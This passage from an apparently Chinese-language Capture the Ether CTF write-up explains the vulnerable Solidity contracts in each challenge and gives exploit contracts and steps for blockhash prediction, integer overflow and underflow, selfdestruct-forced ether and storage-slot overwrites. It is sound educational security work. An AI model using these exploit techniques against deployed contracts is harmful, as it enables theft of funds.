class="code"><pre><span class="line">contract attacker &#123;</span><br><span class="line">    PredictTheFutureChallenge target;</span><br><span class="line">    uint public result;</span><br><span class="line">    function attacker() public payable &#123;</span><br><span class="line">        target = PredictTheFutureChallenge(0x1B67a75C3A4754d2586697722C36f181B7b82f5d);</span><br><span class="line">        target.lockInGuess.value(1 ether)(8);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function exploit() public payable &#123;</span><br><span class="line">        result = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line">            if (result == 8) &#123;</span><br><span class="line">            target.settle();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function () public payable &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Predict-the-block-hash"><a href="#Predict-the-block-hash" class="headerlink" title="Predict the block hash"></a>Predict the block hash</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheBlockHashChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    bytes32 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheBlockHashChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(bytes32 hash) public payable &#123;</span><br><span class="line">        require(guesser == 0);</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = hash;</span><br><span class="line">        settlementBlockNumber = block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line">        bytes32 answer = block.blockhash(settlementBlockNumber);</span><br><span class="line">        guesser = 0;</span><br><span class="line">        if (guess == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题与上一题基本类似，不一样的地方在于需要猜当前块的 hash，但是对于<code>block.blockhash</code>这个函数，可以获取给定区块号的 <strong>hash</strong> 值，但只支持最近的 256 个区块，对于 256 个区块之外的区块，<code>block.blockhash</code>函数都将返回 0，所以可以先传递 <code>guess</code>为 0，然后等待 256 个区块再调用<code>settle</code>函数即可，具体代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheBlockHashChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    bytes32 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheBlockHashChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(bytes32 hash) public payable &#123;</span><br><span class="line">        require(guesser == 0);</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = hash;</span><br><span class="line">        settlementBlockNumber = block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        bytes32 answer = block.blockhash(settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        guesser = 0;</span><br><span class="line">        if (guess == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attacker &#123;</span><br><span class="line"></span><br><span class="line">    PredictTheBlockHashChallenge target;</span><br><span class="line">    uint public result;</span><br><span class="line">    uint public num;</span><br><span class="line">    function attacker() public payable &#123;</span><br><span class="line">        target = PredictTheBlockHashChallenge(0xCF221473d9F6Ae7b95D47710776f5e7733C745F3);</span><br><span class="line">        target.lockInGuess.value(1 ether)(0);</span><br><span class="line">        num = block.number</span><br><span class="line">    &#125;</span><br><span class="line">    function exploit() public payable &#123;</span><br><span class="line">    if(block.number - num &gt; 256) &#123;</span><br><span class="line">            target.settle();</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function () public payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="Token-Sale"><a href="#Token-Sale" class="headerlink" title="Token Sale"></a>Token Sale</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenSaleChallenge &#123;</span><br><span class="line">//题目中定义了一个虚拟代币，通过mapping来追踪地址的代币数额</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    uint256 constant PRICE_PER_TOKEN = 1 ether;</span><br><span class="line">//和合约同名的构造函数，要求合约的初始余额为1 ether，</span><br><span class="line">    function TokenSaleChallenge(address _player) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line">//判断完成的条件要求合约中的余额小于 1 ether</span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &lt; 1 ether;</span><br><span class="line">    &#125;</span><br><span class="line">//定义了买入token的方法，买入后更新mapping</span><br><span class="line">    function buy(uint256 numTokens) public payable &#123;</span><br><span class="line">        require(msg.value == numTokens * PRICE_PER_TOKEN);</span><br><span class="line">        balanceOf[msg.sender] += numTokens;</span><br><span class="line">    &#125;</span><br><span class="line">//定义了卖出token的方法</span><br><span class="line">    function sell(uint256 numTokens) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= numTokens);</span><br><span class="line">        balanceOf[msg.sender] -= numTokens;</span><br><span class="line">        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先分析题目，题目中定义了一个虚拟代币，通过mapping来追踪地址的代币数额，<code>TokenSaleChallenge</code> 是和合约同名的构造函数，要求合约的初始余额为1 ether，当合约中的余额小于1 ether时完成题目。</p><p>由于买入多少币才能卖出多少币，所以如果想要能转出的买入的更多，就要求在买入的时候上溢，恰好这个合约没有safemath，存在溢出漏洞。</p><p>当买入的 token 小于 卖出的token 时可以利用溢出漏洞达到完成条件。</p><p>在<code>buy</code>函数中的的 判断<code>require(msg.value == numTokens * PRICE_PER_TOKEN);</code>，造成溢出需要当<code>msg.value</code>足够小，<code>numTokens</code>足够大，而 <code>PRICE_PER_TOKEN ==1 ether=10^18 wei</code>，所以当<code>numTokens * 10^18 &gt;= 2^256</code>时会上溢出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// msg.value == numTokens * PRICE_PER_TOKEN</span><br><span class="line">计算刚好造成上溢出的 numToken</span><br><span class="line">//这里不加1的话计算出来的msg.value会非常大无法发送（115792089237316195423570985008687907853269984665640564039457000000000000000000）</span><br><span class="line">numTokens = 2^256/(10^18) + 1 = 115792089237316195423570985008687907853269984665640564039458</span><br><span class="line">msg.value = numTokens * 10^18 % (2^256) = 415992086870360064 wei</span><br></pre></td></tr></table></figure><p>因为需要以<code>wei</code>为单位发送 ether，所以需要在 Remix 中部署合约，调用<code>buy</code> 函数相当于以较小的<code>msg.value</code>获取到了大量的<code>token</code>,而这些<code>token</code>可以在<code>sell</code>函数中能够以 1 ether 的兑换率被转出， 就相当于以 0.4 ether 充值了相当于 1 ther 的<code>token</code>最后将这些<code>token</code>卖出，合约中的余额就会减少 1 ether，就达成了完成的条件。</p><h3 id="Token-whale"><a href="#Token-whale" class="headerlink" title="Token whale"></a>Token whale</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenWhaleChallenge &#123;</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    string public name = &quot;Simple ERC20 Token&quot;;</span><br><span class="line">    string public symbol = &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals = 18;</span><br><span class="line"></span><br><span class="line">    function TokenWhaleChallenge(address _player) public &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        totalSupply = 1000;</span><br><span class="line">        balanceOf[player] = 1000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return balanceOf[player] &gt;= 1000000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    function _transfer(address to, uint256 value) internal &#123;</span><br><span class="line">        balanceOf[msg.sender] -= value; //利用此处的溢出</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line"></span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= value);</span><br><span class="line">        require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line"></span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value) public &#123;</span><br><span class="line">        allowance[msg.sender][spender] = value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[from] &gt;= value);</span><br><span class="line">        require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line">        require(allowance[from][msg.sender] &gt;= value);</span><br><span class="line"></span><br><span class="line">        allowance[from][msg.sender] -= value;</span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目中的代码是一个标准的 ERC20 标准代码 SET，当 player 即 msg.sender 的余额大于1000000 时完成题目，则需要<code>balanceof[msg.sender]</code>溢出。</p><p>观察主要存在以下几处风险：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">balanceOf[msg.sender] -= value; //27行可能存在下溢出，并且会更新msg.sender余额</span><br><span class="line">balanceOf[to] += value;//28行可能存在上溢出</span><br><span class="line">balanceOf[to] + value &gt;= balanceOf[to] //35行可能存在上溢出</span><br><span class="line">balanceOf[to] + value &gt;= balanceOf[to] //49行可能存在上溢出</span><br><span class="line">allowance[from][msg.sender] -= value;  //52行可能存在下溢出</span><br></pre></td></tr></table></figure><p>所以考虑实际可用的就是27行的下溢出：</p><ul><li><code>transfer()</code>函数调用了<code>_transfer()</code>函数，且存在溢出检查</li><li><code>transferFrom()</code>函数调用了<code>_transfer()</code>函数，不存在溢出检查，调用该函数需要调用<code>approve</code>函数批准转账额度</li></ul><p>逆向思考整个过程：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">要实现 27 行代码中 balanceOf[msg.sender] -= value; 这要求 msg.sender 的 mapping 里面的余额 &lt; value；</span><br><span class="line">_transfer函数应该调用msg.sender._transfer(to,value)，to为可控的account，value应该大于msg.sender的余额</span><br><span class="line">所以要先调用 msg.sender.transferFrom(to,any address,value)。第二个参数没有影响，相当于给这个地址增加token</span><br><span class="line">要求调用to.approve(msg.sender, value)</span><br></pre></td></tr></table></figure><p>所以这道题的解题流程是：</p><ol><li><p>引入一个可控的地址 <strong>to</strong> （需要用该地址发起交易）；</p></li><li><p>调用<code>transfer</code>函数给地址 <strong>to</strong> 转入一些 token，导致 player 的<code>token &lt; value</code>，且<code>value &lt; totalsupply</code>，当 player 的<code>token &lt; value</code>时可以造成下溢出；</p><p><img src="/image/capturetheether.assets/image-20220324164724573.png" alt="image-20220324164724573"></p><p>此时的<code>balanceOf[to]=800,balanceOf[msg.sender]=200</code></p></li><li><p>调用函数<code>to.approve(msg.sender, 800</code>);</p><p><img src="/image/capturetheether.assets/image-20220324163947646.png" alt="image-20220324163947646"></p><p>此时<code>allowance[to][msg.sender]=800</code></p></li><li><p>调用函数<code>msg.sender.transferFrom(to, this, 500);  </code>//选择当前合约地址作为接受 token 的地址</p><p><img src="/image/capturetheether.assets/image-20220324164309172.png" alt="image-20220324164309172"></p><p>在这里<code>address from = address to</code>，调用该函数时只比较了<code>balanceof[to] &gt; value</code>，且<code>allowance[to][msg.sender]=800 &gt; 500</code> 通过验证</p></li><li><p>执行代码<code>msg.sender._transfer(this, 500)</code>;</p></li><li><p>执行代码<code>balanceOf[msg.sender]-=500</code>造成下溢;</p></li><li><p>最终结果</p><p><img src="/image/capturetheether.assets/image-20220324164424093.png" alt="image-20220324164424093"></p></li></ol><h3 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a>Retirement fund</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract RetirementFundChallenge &#123;</span><br><span class="line">    uint256 startBalance;</span><br><span class="line">    address owner = msg.sender;</span><br><span class="line">    address beneficiary;</span><br><span class="line">    uint256 expiration = now + 10 years;</span><br><span class="line"></span><br><span class="line">    function RetirementFundChallenge(address player) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        beneficiary = player;</span><br><span class="line">        startBalance = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        if (now &lt; expiration) &#123;</span><br><span class="line">            // early withdrawal incurs a 10% penalty</span><br><span class="line">            msg.sender.transfer(address(this).balance * 9 / 10);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            msg.sender.transfer(address(this).balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectPenalty() public &#123;</span><br><span class="line">        require(msg.sender == beneficiary);</span><br><span class="line">//startBalance = 1 ether,address(this).balance = 1 ether ,withdrawn = 0</span><br><span class="line">        uint256 withdrawn = startBalance - address(this).balance;</span><br><span class="line"></span><br><span class="line">        // an early withdrawal occurred</span><br><span class="line">        require(withdrawn &gt; 0);</span><br><span class="line"></span><br><span class="line">        // penalty is what&#x27;s left</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当合约地址的余额为0时挑战成功，所以需要找到一个方法从合约中向外转钱。</p><p>该合约中存在一个转账方法<code>&lt;address&gt;.transfer(uint256 amount)</code>，转账的单位为 wei，转账的同时传输 2300 的gas且gas数量不可调整，该合约只有俩个函数会调用<code>transfer</code>方法：<code>withdraw 和 collectPenalty</code>函数，而在<code>withdraw()</code>函数中要求<code>require(msg.sender == owner);</code>，此时的 owner 是Capture the Ether factory contract，所以我们无法通过<code>require</code>判断，只能调用<code>collectPenalty</code>函数中的 <code>thransfer</code> 方法。</p><p>所以整个流程为：</p><ol><li>调用<code>collectPenalty</code>函数，通过判断<code>require(msg.sender == beneficiary)</code>;</li><li>执行<code>withdrawn = startBalance - address(this).balance;</code></li><li>判断 <code>withdrawn &gt;0</code>;</li><li>执行<code>msg.sender.transfer(address(this).balance);</code></li></ol><p>在第二部中由于<code>startBalance = 1 ether,address(this).balance = 1 ether ,withdrawn = 0</code>,无法使<code>withdrawn &gt;0</code>,所以可以通过部署一个合约，使用 <strong>selfdestruct</strong> 方法将该合约中的钱转入<code>RetirementFundChallenge</code>合约，当转入钱以后,<code>starttBalance = 1, address(this).balance &gt; 1</code>，此时就会造成下溢出，使其通过<code>withdrawn &gt; 0</code>的判断，最后使用  <code>thransfer</code> 方法将合约中的钱全部转出。</p><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.7.3;</span><br><span class="line">contract Attack &#123;</span><br><span class="line">constructor(address payable target) payable &#123;</span><br><span class="line">require(msg.value &gt; 0);</span><br><span class="line">selfdestruct(target);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract MappingChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line">    uint256[] map;</span><br><span class="line"></span><br><span class="line">    function set(uint256 key, uint256 value) public &#123;</span><br><span class="line">        // Expand dynamic array as needed</span><br><span class="line">        if (map.length &lt;= key) &#123;</span><br><span class="line">            map.length = key + 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        map[key] = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get(uint256 key) public view returns (uint256) &#123;</span><br><span class="line">        return map[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目中判断是否完成的<code>isComplete</code>是一个布尔类型的变量，由于在该合约中没有改变其状态的函数，可以联想通过<code>storage</code>覆盖的方式，改变<code>isComplete</code>的值，只要写入数据就会变成 <strong>true。</strong></p><p>这个合约中只有俩个状态变量，而以太坊的 storage 中对于uint、mapping类型变量在不赋值的情况下会被初始化为 0，占用一个 slot（uint8 = uint256），对于struct对象，没有实例化的话不会占用slot，所以对于该合约这俩个变量的排列规则是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------</span><br><span class="line">|          unused(31)          ｜  isComplete(1)  | &lt;- slot 0</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                 map.length                      | &lt;- slot 1</span><br><span class="line">---------------------------------------------------</span><br><span class="line">// ...</span><br><span class="line">slot keccak(1): map[0]</span><br><span class="line">slot keccak(1) + 1: map[1]</span><br><span class="line">slot keccak(1) + 2: map[2]</span><br><span class="line">slot keccak(1) + 3: map[3]</span><br><span class="line">slot keccak(1) + 4: map[4]</span><br><span class="line">// ...</span><br></pre></td></tr></table></figure><p>由存储结构可以联想到利用<code>map.length</code>的长度造成上溢，使<code>isComplete</code>变成true。即插槽 slot 1保存的是动态数组<code>map[]</code>的大小，该插槽的<code>keccak256</code>作为存储值的地址，如果可以以某种方式扩展该数组的边界使其覆盖掉<code>isComplete</code>的存储插槽，只要能找到写到哪个地址就可以访问并覆盖掉<code>isComplete</code>的值。</p><ol><li><p>计算需要访问哪个地址才能访问到<code>isComplete</code>，即访问到 slot 0；</p></li><li><p>计算<code>map[]</code>数组开始的地址，动态数组的第一个元素的位置计算公式为:<code>keccak256(bytes32(position))</code>,<code>map[]</code>数组的 position 为 slot 1，所以起始位置为<code>keccak256(bytes32(1))</code>，即<code>0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</code>;</p></li><li><p>由<code>map[]</code>数组中任意一个动态数组内的元素所在位置的计算公式为：<code>slot keccak(1) + map[index]</code>，所以要使 slot 的 key 值越界到 0 就可以控制 slot 1 的value，所以需要<code>keccak + index == 2^256</code>，所以 index 为：<code>35707666377435648211887908874984608119992236509074197713628505308453184860938</code>,即<code>map[]</code>数组在这个位置的变量会发生越界，且其值可以覆盖 map.length 的值。</p><p>计算方法：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span>**<span class="number">256</span> - <span class="built_in">int</span>(<span class="number">0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span>)</span><br></pre></td></tr></table></figure></li><li><p>调用函数<code>set(key, value)</code>，key 为刚才计算的 index，value 为任意正数</p><p><img src="/image/capturetheether.assets/image-20220325170933550.png" alt="image-20220325170933550"></p></li></ol><h3 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a>Donation</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract DonationChallenge &#123;</span><br><span class="line">    struct Donation &#123;</span><br><span class="line">        uint256 timestamp;</span><br><span class="line">        uint256 etherAmount;</span><br><span class="line">    &#125;</span><br><span class="line">    Donation[] public donations;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function DonationChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        </span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donate(uint256 etherAmount) public payable &#123;</span><br><span class="line">        // amount is in ether, but msg.value is in wei</span><br><span class="line">        uint256 scale = 10**18 * 1 ether;</span><br><span class="line">        require(msg.value == etherAmount / scale);</span><br><span class="line"></span><br><span class="line">        Donation donation;</span><br><span class="line">        donation.timestamp = now;</span><br><span class="line">        donation.etherAmount = etherAmount;</span><br><span class="line"></span><br><span class="line">        donations.push(donation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        </span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这道题完成的条件是合约中的余额为 0 ，在构造函数中合约被转入了 1 ether，所以这道题就是要把这 1 ether 转出，只有在 <code>withdraw</code>函数中存在 <strong>transfer</strong> 方法，但是要求<code>msg.sender == owner</code>，目前 owner 在构造函数中被赋值，所以这道题的思路就是把 owner 的 slot 覆盖。</p><p>以太坊的 storage 中对于uint、mapping类型变量在不赋值的情况下会被初始化为 0，占用一个 slot（uint8 = uint256），对于struct对象，没有实例化的话不会占用slot，在这道题中，对结构体以及结构体数组均为赋初始值，所以存在未初始化的存储指针漏洞，storage 里的存储布局如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------------------------</span><br><span class="line">|              Donation.length                | &lt;- slot 0</span><br><span class="line">-----------------------------------------------</span><br><span class="line">|    unused(12   |        owner(20)           | &lt;- slot 1</span><br><span class="line">-----------------------------------------------</span><br><span class="line">|                 .............               | </span><br><span class="line">-----------------------------------------------</span><br></pre></td></tr></table></figure><p><code>timestamp</code>处传入的参数永远为 now ，只有<code>etherAmount</code>参数可控，由于是通过 push 给 动态数组<code>Donations</code>增加元素，所以无法将slot 地址上溢为 1。</p><p>这里需要利用 solidity 低版本特性，**<font color=red>struct 不赋值不会默认初始化，即结构体不赋值不会占用slot，由于结构体在函数内非显示地初始化时会使用storage存储而不是memory，所以可以达到变量覆盖的效果。</font>**</p><p>参考：<a href="http://www.freebuf.com/articles/blockchain-articles/175237.html">Solidity中存储方式错误使用所导致的变量覆盖</a></p><p>所以当<code>timestamp和etherAmount</code>在函数中初始化时会覆盖掉 slot 0 和 slot 1，如果让<code>etherAmount</code>传入自己的地址，就可以覆盖 owner，通过<code>require(msg.sender == owner);</code>检查。这里需要计算<code>msg.value</code>，因为<code>msg.value == etherAmount / scale ，scale = 10**18</code>，所以传入的 <code>value = etherAmount / 10**18/10**18</code>，然后调用<code>donate()</code>函数。</p><h3 id="Fifty-years"><a href="#Fifty-years" class="headerlink" title="Fifty years"></a>Fifty years</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract FiftyYearsChallenge &#123;</span><br><span class="line">    struct Contribution &#123;</span><br><span class="line">        uint256 amount;</span><br><span class="line">        uint256 unlockTimestamp;</span><br><span class="line">    &#125;</span><br><span class="line">    Contribution[] queue;</span><br><span class="line">    uint256 head;</span><br><span class="line"></span><br><span class="line">    address owner;</span><br><span class="line">    function FiftyYearsChallenge(address player) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        owner = player;</span><br><span class="line">        queue.push(Contribution(msg.value, now + 50 years));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upsert(uint256 index, uint256 timestamp) public payable &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123;</span><br><span class="line">            // Update existing contribution amount without updating timestamp.</span><br><span class="line">            Contribution storage contribution = queue[index];</span><br><span class="line">            contribution.amount += msg.value;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // Append a new contribution. Require that each contribution unlock</span><br><span class="line">            // at least 1 day after the previous one.</span><br><span class="line">            require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);</span><br><span class="line"></span><br><span class="line">            contribution.amount = msg.value;</span><br><span class="line">            contribution.unlockTimestamp = timestamp;</span><br><span class="line">            queue.push(contribution);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 index) public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        require(now &gt;= queue[index].unlockTimestamp);</span><br><span class="line"></span><br><span class="line">        // Withdraw this and any earlier contributions.</span><br><span class="line">        uint256 total = 0;</span><br><span class="line">        for (uint256 i = head; i &lt;= index; i++) &#123;</span><br><span class="line">            total += queue[i].amount;</span><br><span class="line"></span><br><span class="line">            // Reclaim storage.</span><br><span class="line">            delete queue[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Move the head of the queue forward so we don&#x27;t have to loop over</span><br><span class="line">        // already-withdrawn contributions.</span><br><span class="line">        head = index + 1;</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(total);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Fifty years 综合考察了 math 系列的知识点，完成挑战的条件是将合约中的钱全部转出。</p><ol><li><p>调用 withdraw 函数中的 transfer 方法可以将合约中的钱全部转出，调用 withdraw 时需要<code>withdraw(queue.lengtht - 1)</code>，即取最后一笔的时候会把之前的存款加起来一次性取出；</p></li><li><p>执行 withdraw 函数时需要满足<code>require(now &gt;= queue[index].unlockTimestamp)</code>，在构造函数中的结构体数组的第一个元素为 <code>now + 50 years</code>，后面每一次插入新元素解锁时间都会再加一天，所以 now 至少应该大于50年以后；</p></li><li><p>所以如果要调用 transfer 方法就需要绕过 timestamp 的检查，由于 storage 中的存储布局如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------</span><br><span class="line">|                    queue.length                 | &lt;- slot 0</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                      head                       | &lt;- slot 1</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                      owner                      | &lt;- slot 2</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                      ......                     | </span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                      msg.value                  | &lt;- slot keccak256(0)</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                    now + 50 year                | &lt;- slot keccak256(0) + 1</span><br><span class="line">---------------------------------------------------</span><br></pre></td></tr></table></figure><p>根据存储布局分析，在 upsert 中构造溢出，利用未初始化存储指针漏洞，当 struct 未被赋初值时不占用 slot，在upsert 函数中被赋值后会覆盖 <code>queue.length 和 head</code>，即 覆盖掉 slot 0 和 slot 1，即最终的存储结构为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------</span><br><span class="line">|       contribution.amount = msg.value           | &lt;- slot 0</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|    contribution.unlockTimestamp = timestamp     | &lt;- slot 1</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                      owner                      | &lt;- slot 2</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                      ......                     | </span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                      msg.value                  | &lt;- slot keccak256(0)</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                    now + 50 year                | &lt;- slot keccak256(0) + 1</span><br><span class="line">---------------------------------------------------</span><br></pre></td></tr></table></figure><p>被覆盖以后会改变<code>queue[head]</code>的值，即覆盖掉<code>queue[0].unlockTimestamp</code>。</p></li><li><p>在<code>upset()</code>函数中的 if 语句的<code>upset(0, timestamp)</code>不会改变 timestamp，只会更新 amount，只有当<code>timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 